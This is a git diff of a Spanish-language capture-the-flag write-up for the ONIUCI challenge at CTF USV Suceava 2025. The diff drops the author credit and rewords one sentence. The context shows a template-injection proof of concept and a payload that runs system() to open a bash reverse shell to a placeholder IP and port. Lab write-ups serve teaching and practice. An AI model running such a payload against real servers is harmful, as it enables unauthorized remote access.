@@ -1,7 +1,6 @@
 ![image_desc](img/CTF_USV_2025.jpg)
 
 # CTF USV Suceava 2025 (ONIUCI Writeup)
-#### Por Calana2 (a.k.a `s1s1fo`)
 
 ## Resumen
 
@@ -38,7 +37,7 @@ Después de jugar "luz-roja luz-verde" en el sitio web expuesto en el puerto 808
 
 Esto sugiere STTI en uno de los campos del formulario que actualiza la información del jugador. PoC: `{{ 2+2 }}`
 
-Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell en <INSERTAR STTI\>:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`
+Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell usando el motor de plantillas:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`
 
 ![image_desc](img/2025-11-27-194840_1346x477_scrot.png)
 
